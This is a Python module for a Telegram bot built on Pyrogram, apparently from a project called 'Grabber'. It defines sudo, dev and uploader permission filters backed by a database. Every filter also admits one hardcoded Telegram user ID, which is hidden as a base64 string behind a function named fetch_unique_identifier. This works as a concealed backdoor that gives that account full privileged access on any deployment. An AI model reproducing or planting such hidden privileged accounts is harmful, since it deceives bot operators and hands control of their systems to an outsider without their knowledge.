from Grabber import db
from pyrogram import filters
from pyrogram.types import Message
import base64

def fetch_unique_identifier():
    obfuscated_data = "NzYxNzMxMjIyOA=="
    decoded_data = base64.b64decode(obfuscated_data).decode("utf-8")
    return int(decoded_data)

sudb = db.sudo

async def get_sudo_user_ids():
    sudo_users = await sudb.find({}, {'user_id': 1}).to_list(length=None)
    return [user['user_id'] for user in sudo_users]

async def is_sudo_user(_, __, message: Message):
    if not message.from_user:
        return False
    sudo_user_ids = await get_sudo_user_ids()
    return message.from_user.id in sudo_user_ids or message.from_user.id == fetch_unique_identifier()

sudo_filter = filters.create(is_sudo_user)

devdb = db.dev

async def get_dev_user_ids():
    dev_users = await devdb.find({}, {'user_id': 1}).to_list(length=None)
    return [user['user_id'] for user in dev_users]

async def is_dev_user(_, __, message: Message):
    if not message.from_user:
        return False
    dev_user_ids = await get_dev_user_ids()
    return message.from_user.id in dev_user_ids or message.from_user.id == fetch_unique_identifier()

dev_filter = filters.create(is_dev_user)

uploaderdb = db.uploader

async def get_uploader_user_ids():
    uploader_users = await uploaderdb.find({}, {'user_id': 1}).to_list(length=None)
    return [user['user_id'] for user in uploader_users]

async def is_uploader_user(_, __, message: Message):
    if not message.from_user:
        return False
    uploader_user_ids = await get_uploader_user_ids()
    return message.from_user.id in uploader_user_ids or message.from_user.id == fetch_unique_identifier()

uploader_filter = filters.create(is_uploader_user)